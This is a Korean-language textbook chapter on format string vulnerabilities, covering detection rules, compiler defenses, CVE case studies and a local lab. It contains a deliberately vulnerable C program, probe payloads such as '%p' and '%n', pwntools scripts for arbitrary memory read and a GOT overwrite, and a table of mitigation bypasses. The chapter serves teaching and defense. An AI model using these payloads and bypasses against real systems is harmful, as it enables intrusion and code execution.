# 포맷 스트링 (Format String Vulnerability)

| 레벨 | 상태 | 최종 개정 | CWE |
|---|---|---|---|
| 🟡 (7절은 🔴) | 🔄 개정중 | 2026-10-22 | [CWE-134](https://cwe.mitre.org/data/definitions/134.html) |

> **한눈에 보기**
> `printf(user_input)` 한 줄이면 스택을 읽고, `%n`으로 임의 주소에 쓴다. 발견은 grep 한 줄, 영향은 코드 실행이다.
> 오버플로와 달리 버퍼를 넘치게 할 필요가 없어 카나리에 걸리지 않고, 읽기와 쓰기를 모두 주기 때문에 다른 취약점의 "주소 누출" 역할로도 쓰인다.
> 막는 방법은 하나다. **포맷 문자열은 항상 리터럴**이어야 한다. `printf("%s", s)`.

## 1. 원리

`printf`는 **가변 인자 함수**다. 포맷 문자열의 `%` 지시자 개수만큼 인자가 뒤따른다고 **믿고** 읽는다. 인자가 실제로 몇 개 왔는지 확인할 방법이 없다. 신뢰 경계는 "포맷 문자열은 개발자가 쓴 것"이라는 가정에서 무너진다.

[01장 3절](01-memory-basics.md)의 호출 규약이 여기서 중요하다. x86-64 SysV에서 가변 인자는 `rsi, rdx, rcx, r8, r9` 다음 **스택**에서 읽는다. 포맷 문자열에 `%p`가 여섯 개 있으면 레지스터 5개를 다 쓰고 여섯 번째는 `[rsp]`를 읽는다. 그 스택에는 호출자의 지역 변수, 즉 **입력 버퍼 자체**가 있다.

```
 printf(buf) 호출 시점의 인자 공급원

 %1$  rsi          ← 쓰레기 또는 이전 값
 %2$  rdx
 %3$  rcx
 %4$  r8
 %5$  r9
 ─── 여기부터 스택 ───
 %6$  [rsp]        ← main의 지역 변수 = buf[0..7]   ★ 공격자가 쓴 바이트
 %7$  [rsp+8]      ← buf[8..15]
 %8$  [rsp+16]     ← buf[16..23]
 ...
```

<figure>
<figcaption>그림 1. 가변 인자 공급 순서. 여섯 번째 인자부터 스택이고, 그 스택에 입력 버퍼가 있다. 공격자는 "인자"로 읽힐 값을 자기가 넣은 뒤 그 값을 주소로 쓰는 지시자(%s, %n)를 고른다.</figcaption>
</figure>

| 지시자 | 하는 일 | 공격자에게 주는 것 |
|---|---|---|
| `%x`, `%p` | 인자를 16진수로 출력 | 스택 내용 **읽기**. 카나리, 반환 주소, libc 주소 누출 |
| `%s` | 인자를 **주소로 보고** 그 문자열 출력 | 임의 주소 읽기. 잘못된 주소면 크래시 |
| `%n` | 지금까지 출력한 **글자 수**를 인자가 가리키는 `int*`에 **쓴다** | 임의 주소 쓰기 |
| `%hn`, `%hhn` | 같은 동작을 2바이트, 1바이트로 | 큰 값을 나눠 쓰기 |
| `%N$...` | N번째 인자를 직접 지정 | 원하는 스택 위치를 정확히 겨냥 |
| `%Nc` | N글자 폭으로 출력 | `%n`에 들어갈 글자 수 조절 |

`%n`은 표준 기능이다. 출력 길이를 변수에 돌려받으려고 만든 것이다. 이 "쓰기" 기능이 "읽을 주소를 공격자가 정한다"와 만나면 **임의 주소에 임의 값 쓰기**(write-what-where)가 된다.

## 2. 발생하는 코드 패턴

```c
// ❌ 취약: 입력이 포맷 문자열 자리에
printf(buf);
fprintf(stderr, msg);
syslog(LOG_INFO, line);
snprintf(out, sizeof out, user);
```

```c
// ✅ 안전: 포맷은 리터럴, 입력은 인자
printf("%s", buf);
fprintf(stderr, "%s", msg);
syslog(LOG_INFO, "%s", line);
snprintf(out, sizeof out, "%s", user);
```

덜 눈에 띄는 변형이 더 많다.

```c
// ❌ 취약: 에러 메시지에 입력을 섞어 포맷으로 넘김
char msg[256];
snprintf(msg, sizeof msg, "unknown user: %s", name);
log_error(msg);                 // log_error 안에서 vfprintf(fp, msg, ap)

// ❌ 취약: 프로그램 이름(argv[0])은 사용자가 정한다. CVE-2012-0809의 형태
fprintf(stderr, argv[0]);

// ❌ 취약: 장치 이름, 파일 이름, 환경 변수도 입력이다. CVE-2022-1215의 형태
log_info(device->name);

// ❌ 취약: 자체 포맷 함수. -Wformat이 모르므로 __attribute__((format)) 없이는 경고도 없다
void log_msg(const char *fmt, ...);
log_msg(user_input);
```

**"입력"의 범위가 넓다.** 네트워크 데이터만이 아니다. 파일 이름, USB 장치 이름, 환경 변수, `argv[0]`, 설정 파일의 문자열, 다른 프로세스가 준 메시지가 모두 포맷 자리에 들어가면 안 된다.

## 3. 탐지 방법

### 3.1 코드 리뷰 / 정적 분석

**컴파일러가 가장 좋은 정적 분석기다.** 두 플래그를 켠다.

```bash
gcc -Wformat -Wformat-security -c foo.c
# foo.c:13:12: warning: format not a string literal and no format arguments [-Wformat-security]
gcc -Werror=format-security -c foo.c        # 경고를 오류로. CI에서 이것을 쓴다
```

`-Wformat-security`는 "포맷이 리터럴이 아니고 인자가 하나도 없는" 호출을 잡는다. 인자가 하나라도 있으면(`printf(fmt, x)`) 놓치므로 `-Wformat=2`(`-Wformat-nonliteral` 포함)를 더한다. 자체 로그 함수에는 `__attribute__((format(printf, 1, 2)))`를 달아야 검사 대상이 된다. Ubuntu, Debian의 gcc는 `-Wformat -Werror=format-security`를 기본으로 켠다.

**grep**은 포맷 함수 호출에서 첫 문자열 인자가 따옴표로 시작하지 않는 것을 찾는다.

```bash
grep -rnE '\b(printf|fprintf|sprintf|snprintf|vprintf|vfprintf|syslog|err|warn)\s*\(\s*[^"]' --include='*.c' . \
  | grep -vE '\(\s*(stderr|stdout|[a-z_]+,)\s*"'
```

**Semgrep** 룰:

```yaml
rules:
  - id: c-format-string-not-literal
    languages: [c]
    severity: ERROR
    message: 포맷 문자열이 리터럴이 아닙니다. "%s" 를 포맷으로 쓰고 입력은 인자로 넘기세요.
    patterns:
      - pattern-either:
          - pattern: printf($FMT)
          - pattern: fprintf($F, $FMT)
          - pattern: syslog($P, $FMT)
      - pattern-not: printf("...")
      - pattern-not: fprintf($F, "...")
      - pattern-not: syslog($P, "...")
```

**CodeQL**의 `cpp/tainted-format-string` 쿼리는 입력(소스)에서 포맷 인자(싱크)까지 흐름을 추적한다. 중간에 `snprintf`로 한 번 복사된 2절의 변형도 잡는다.

### 3.2 동적 테스트

**1단계: `%p` 여러 개.** 입력에 `%p %p %p %p %p %p %p %p`를 넣는다. 출력에 16진수 값이 나오면 입력이 포맷으로 해석된 것이다. 정상 프로그램은 입력을 그대로 되돌려 준다.

```
$ echo '%p %p %p %p %p %p %p %p' | ./fmt
0x1148d2a1 0xfbad2088 0x7f50e1f1bd31 0x1148d2b8 (nil) 0x7025207025207025 ...
                                                       ^ 6번째부터 입력 버퍼('%p %p' 의 바이트)
```

**2단계: `%s` 여러 개.** `%s%s%s%s%s%s%s%s`를 넣는다. 스택 값을 주소로 보고 읽으므로 대개 SIGSEGV가 난다. 크래시가 나면 "임의 주소 읽기"가 성립하는 것이고, 영향도는 최소 DoS다.

**3단계: 오프셋 확인.** `AAAAAAAA%6$p`처럼 표식과 직접 인자 지정을 함께 넣어 `0x4141414141414141`이 몇 번째에 나오는지 찾는다. 이 숫자가 5절 검증과 pwntools 자동화의 입력값이다.

퍼저는 이 유형을 잘 찾는다. `%n`이 들어간 입력은 ASan 없이도 크래시를 내기 때문이다. [09장](09-fuzzing.md).

## 4. 실습 🧪

로컬 컴파일. 포맷 스트링은 스택을 넘치지 않으므로 카나리·NX는 그대로 두고, 주소를 고정하기 위해 PIE만 끈다.

```c
/* fmt.c */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    puts("[+] win() reached");
    _exit(0);
}

int main(void) {
    char buf[256];
    setvbuf(stdout, NULL, _IONBF, 0);
    if (fgets(buf, sizeof buf, stdin) == NULL) return 1;
    printf(buf);                 /* ❌ 사용자 입력이 포맷 문자열 */
    exit(1);
}
```

```bash
gcc -g -O0 -no-pie -o fmt fmt.c
# fmt.c:14:12: warning: format not a string literal and no format arguments [-Wformat-security]
checksec --file=./fmt           # RELRO: Partial RELRO, PIE: No PIE
```

컴파일 단계에서 이미 경고가 나온다. 이 경고를 `-Werror`로 올리는 것이 6절의 첫 줄이다.

### 4.1 스택 읽기와 오프셋

```bash
echo 'AAAAAAAA%6$p' | ./fmt       # AAAAAAAA0x4141414141414141  → 입력 버퍼는 6번째 인자
echo '%6$p %7$p %8$p' | ./fmt     # 버퍼의 8바이트 단위 연속 내용
```

6번째가 `buf[0..7]`, 7번째가 `buf[8..15]`다. 즉 **입력 안에 주소를 넣고 그 위치를 `%N$`로 가리키면** `%s`가 그 주소의 내용을 읽는다. 포맷 문자열은 NUL에서 끝나므로 주소(상위 바이트가 0)는 지시자 **뒤에** 둔다.

```python
#!/usr/bin/env python3
# read_rodata.py — .rodata의 문자열을 임의 주소 읽기로 꺼낸다
from pwn import *

context.arch = 'amd64'
elf = ELF('./fmt')
addr = next(elf.search(b'[+] win() reached'))   # .rodata, 0x402004

p = process('./fmt')
p.sendline(b'%8$s'.ljust(16, b'A') + p64(addr)) # 8번째 인자 = buf[16..23] = addr
print(p.recvall(timeout=1))                     # b'[+] win() reached...'
```

같은 방법으로 GOT 항목을 읽으면 이미 호출된 libc 함수의 실제 주소가 나온다. ASLR이 켜진 환경에서 libc 기준 주소를 계산하는 가장 흔한 누출 경로다. [07장](07-mitigations.md).

### 4.2 `%n` 쓰기의 원리

`%n`은 "지금까지 출력한 글자 수"를 쓴다. 값 `0x4011f6`을 쓰려면 420만 글자를 출력해야 하므로, 실제로는 **2바이트(`%hn`) 또는 1바이트(`%hhn`) 단위로 나눠 쓴다**. 주소를 바이트 단위로 쪼개 여러 개 넣고, 각각에 `%Nc`로 글자 수를 맞춘 뒤 `%M$hhn`으로 쓴다. 출력 카운터는 되돌릴 수 없으므로 작은 값부터 순서대로 쓴다.

이 계산은 손으로 하면 틀리기 쉽다. pwntools가 해 준다.

```python
#!/usr/bin/env python3
# got_overwrite.py — exit의 GOT 항목을 win 주소로 바꾼다 (Partial RELRO에서만 가능)
from pwn import *

context.arch = 'amd64'
elf = ELF('./fmt')
offset = 6                                        # 4.1에서 찾은 값

payload = fmtstr_payload(offset, {elf.got['exit']: elf.symbols['win']})
# 기본은 바이트 단위(%hhn). write_size='short' 로 %hn 분할, 'int' 로 %n 단일 쓰기
p = process('./fmt')
p.sendline(payload)
print(p.recvall(timeout=2)[-30:])                 # ... [+] win() reached
```

`fmtstr_payload`는 "주소: 값" 사전을 받아 필요한 `%c`·`%hhn` 조합과 주소 목록을 자동으로 만든다. 오프셋을 모르면 `FmtStr(execute_fmt=함수)`가 자동으로 찾아 준다.

**GOT 덮어쓰기가 왜 통하는가**: 동적 링크된 바이너리는 `exit`를 부를 때 GOT 테이블의 포인터를 거쳐 간다([01장 1절](01-memory-basics.md)). Partial RELRO에서는 이 테이블이 쓰기 가능하다. 포인터를 `win`으로 바꾸면 `exit(1)` 호출이 `win()` 호출이 된다. `-Wl,-z,relro,-z,now`(Full RELRO)로 빌드하면 테이블이 읽기 전용이 되고, 같은 페이로드는 SIGSEGV로 끝난다. 직접 확인해 본다.

```bash
gcc -g -O0 -no-pie -Wl,-z,relro,-z,now -o fmt_relro fmt.c
checksec --file=./fmt_relro     # RELRO: Full RELRO
```

### 4.3 고치기

`printf(buf)`를 `printf("%s", buf)`로 바꾸고, `-Werror=format-security`로 빌드가 통과하는지, 4.1~4.2가 모두 실패하는지 확인한다.

## 5. 익스플로잇 검증

| 단계 | 확인 | 심각도에 미치는 영향 |
|---|---|---|
| 1 | `%p` 입력에 16진수가 출력된다 | 취약점 존재. 메모리 내용 누출(기밀성) |
| 2 | `%s` 입력에 크래시 | DoS. 임의 주소 읽기 가능성 |
| 3 | 입력 안의 주소를 `%N$s`로 읽을 수 있다 | 임의 읽기 확정. 카나리·libc 주소 누출 → 다른 취약점의 완화 우회에 쓰인다 |
| 4 | `%n` 계열로 입력 안의 주소에 값이 써진다 | 임의 쓰기 확정. Partial RELRO면 코드 실행(Critical) |

3단계까지만으로도 High다. 포맷 스트링은 **단독으로도, 다른 취약점의 보조로도** 쓰이기 때문이다. 보고서에는 (1) 어떤 입력 경로로 포맷에 닿는지 (2) 읽기만 되는지 쓰기도 되는지 (3) 바이너리의 RELRO·PIE 상태를 적는다.

쓰기가 되는데 Full RELRO라면 GOT 대신 다른 함수 포인터(`atexit` 핸들러, `__malloc_hook` 같은 glibc 내부 포인터는 2.34에서 제거됨, 반환 주소)가 대상이 된다. 실습 범위를 넘어가므로 [07장](07-mitigations.md)과 [08장](08-rop.md)에서 다룬다.

## 6. 방어

| 계층 | 조치 | 효과 |
|---|---|---|
| 코드 | 포맷 문자열은 **항상 리터럴**. 입력은 `%s` 인자로 | 근본 제거 |
| 코드 | 자체 로그·출력 함수에 `__attribute__((format(printf, N, M)))` | 컴파일러 검사 범위에 포함 |
| 컴파일러 | `-Wformat=2 -Werror=format-security` | 빌드 단계에서 차단. 비용 0 |
| 컴파일러 | `-D_FORTIFY_SOURCE=2` 이상 | `%n`이 **쓰기 가능 메모리의 포맷**에 있으면 glibc가 실행을 중단한다 (`*** %n in writable segment detected ***`) |
| 링커 | `-Wl,-z,relro,-z,now` (Full RELRO) | GOT 덮어쓰기 차단 |
| 인프라 | PIE + ASLR | 쓸 주소를 알기 어렵게. 단 포맷 스트링 자체가 주소를 누출하므로 단독으로는 약하다 |
| 탐지 | 입력에 `%n`, `%hn`, `%N$` 패턴 로그 알림. 비정상 긴 출력(`%Nc`) | 공격 시도 포착 |

**하지 말아야 할 것**: 입력에서 `%`를 제거하거나 `%%`로 치환하는 "필터". 다른 경로(`argv[0]`, 환경 변수, 파일 이름)는 거르지 못하고, 포맷으로 넘기는 구조 자체가 남는다. 고칠 곳은 **`printf` 호출 줄**이다.

## 7. 우회 기법 🔴

| 방어 | 우회 |
|---|---|
| Full RELRO | GOT 대신 스택의 반환 주소, `.fini_array`(Full RELRO면 역시 읽기 전용), 힙·`.bss`의 함수 포인터, `atexit` 등록 포인터 |
| `_FORTIFY_SOURCE`의 `%n` 차단 | 검사는 포맷 문자열이 **쓰기 가능 메모리**에 있을 때만 적용된다. 읽기(`%s`, `%p`)는 막지 않으므로 누출 용도는 그대로 |
| PIE + ASLR | 같은 취약점으로 먼저 주소를 읽고(스택의 반환 주소 → 코드 기준, GOT → libc 기준) 두 번째 입력에서 쓴다. 한 번의 입력으로 끝내야 하면 부분 덮어쓰기 |
| 입력 길이 제한 | `%N$`로 패딩 없이 정확한 인자만 지정. `%hhn` 대신 `%hn`으로 쓰기 횟수 절반 |
| `%` 필터 | 와이드 문자 함수(`wprintf`)나 다른 인코딩 경로, 또는 2절의 간접 경로(`snprintf`로 만든 메시지를 다시 포맷으로) |
| 스택에 입력 버퍼가 없음 (힙 입력) | 스택에 우연히 있는 **포인터 체인**(`rbp` 사슬)을 1차 `%n`으로 조작해 2차 쓰기 주소를 만든다. 입력 횟수가 여러 번 필요 |

핵심은 두 가지다. 포맷 스트링은 **읽기와 쓰기를 한 취약점에서** 주기 때문에 ASLR을 스스로 무력화하고, 그래서 "읽기만 된다"는 보고를 가볍게 보면 안 된다.

## 8. 실제 CVE 사례

| CVE | 제품 | 핵심 | 패치 |
|---|---|---|---|
| [CVE-2012-0809](https://nvd.nist.gov/vuln/detail/CVE-2012-0809) | sudo 1.8.0~1.8.3p1 | 디버그 출력에서 **프로그램 이름**(`argv[0]`, 심볼릭 링크로 조작 가능)을 포맷으로 사용. 로컬 → root | [sudo 권고](https://sudo.ws/alerts/sudo_debug.html) |
| [CVE-2015-8617](https://nvd.nist.gov/vuln/detail/CVE-2015-8617) | PHP 7.0.0 | 존재하지 않는 클래스 이름을 에러 메시지의 포맷으로 사용. 클래스 이름에 `%`를 넣은 스크립트로 트리거 | [PHP 버그 #71105](https://bugs.php.net/bug.php?id=71105) |
| [CVE-2022-1215](https://nvd.nist.gov/vuln/detail/CVE-2022-1215) | libinput < 1.19.4 | **USB 장치 이름**을 로그 포맷으로 사용. 장치 이름에 `%`를 넣은 기기를 꽂으면 Xorg 권한으로 실행 | [libinput 이슈 #752](https://gitlab.freedesktop.org/libinput/libinput/-/issues/752) |
| [CVE-2012-3569](https://nvd.nist.gov/vuln/detail/CVE-2012-3569) | VMware OVF Tool 2.1 | OVF 파일의 XML 속성값을 포맷으로 사용. 파일을 여는 것만으로 코드 실행 | VMSA-2012-0015 · [MSVR13-002](https://technet.microsoft.com/en-us/library/security/MSVR13-002) |

**sudo (CVE-2012-0809)에서 배울 것**: 권고문 기준, 수정은 프로그램 이름을 포맷 인자가 아니라 `%s`의 **인자로** 넘기는 것이었다. 한 줄 패치다. 교훈은 "입력"의 범위다. `argv[0]`은 실행하는 사람이 정한다. 로그·디버그 코드는 리뷰에서 자주 건너뛰지만, setuid 바이너리에서는 그 코드가 root로 돈다.

**libinput (CVE-2022-1215)에서 배울 것**: 패치 "evdev: strip the device name of format directives"는 장치 이름의 `%`를 다른 문자로 치환하고, 로그 호출을 리터럴 포맷으로 바꿨다. 입력이 **하드웨어 설명자**에서 온다는 점이 특이하다. 신뢰 경계는 네트워크에만 있지 않다. [1부 3장](../part1-foundations/03-attack-surface.md).

**PHP (CVE-2015-8617)에서 배울 것**: 권고문 기준, 클래스 이름을 포맷 인자로 넘기도록 바꿨다. PHP 스크립트는 "신뢰된 코드"로 보이지만 공유 호스팅에서는 스크립트 작성자가 곧 공격자다. 인터프리터의 메모리 취약점은 샌드박스 탈출이다.

## 9. 체크리스트

**코드 리뷰할 때**
- [ ] 모든 `printf` 계열·`syslog`·`err`/`warn` 호출의 포맷 인자가 리터럴인가?
- [ ] 자체 로그 함수에 `format` 속성이 있는가? 그 함수를 호출하는 곳도 리터럴인가?
- [ ] 에러 메시지를 `snprintf`로 조립한 뒤 다시 포맷 자리에 넣는 곳이 있는가?
- [ ] `argv[0]`, 환경 변수, 파일·장치 이름이 출력에 쓰이는 경로가 있는가?

**테스트할 때**
- [ ] 모든 문자열 입력에 `%p%p%p%p%p%p%p%p`를 넣어 봤는가?
- [ ] 출력에 16진수가 보이면 `%N$p`로 입력 버퍼 오프셋을 확인했는가?
- [ ] 빌드 로그에 `-Wformat-security` 경고가 있는가?

**배포 전**
- [ ] CI에 `-Wformat=2 -Werror=format-security`가 있는가?
- [ ] `checksec`에서 Full RELRO인가?
- [ ] 릴리스 빌드에 `_FORTIFY_SOURCE`가 켜져 있는가? (`-O1` 이상 필요)

## 10. 더 읽기

- [CWE-134: Use of Externally-Controlled Format String](https://cwe.mitre.org/data/definitions/134.html) · 공식 정의
- scut / team teso, "Exploiting Format String Vulnerabilities" (2001). [원문 PDF](https://cs155.stanford.edu/papers/formatstring-1.2.pdf) · 이 유형을 처음 체계적으로 정리한 글. `%hn` 분할 쓰기의 출처
- [GCC: Warning Options — `-Wformat`](https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html) · `-Wformat-security`, `-Wformat=2`, `format` 속성의 공식 설명
- [pwntools 문서: `fmtstr`](https://docs.pwntools.com/en/stable/fmtstr.html) · `fmtstr_payload`, `FmtStr`의 모든 인자
- [glibc 매뉴얼: Formatted Output](https://www.gnu.org/software/libc/manual/html_node/Formatted-Output.html) · `%n`, `%N$` 지시자의 정확한 의미
- [SEI CERT C: FIO30-C](https://wiki.sei.cmu.edu/confluence/display/c/FIO30-C.+Exclude+user+input+from+format+strings) · 코딩 규칙으로서의 정리

## 변경 이력

| 날짜 | 변경 | 기여자 |
|---|---|---|
| 2026-10-21 | 초안(뼈대) 작성 | @anthonynoh5202 |
| 2026-10-22 | 본문 작성. 실습 출력과 pwntools 스크립트는 Ubuntu 24.04 / gcc 13.3 / glibc 2.39에서 실측 | @anthonynoh5202 |
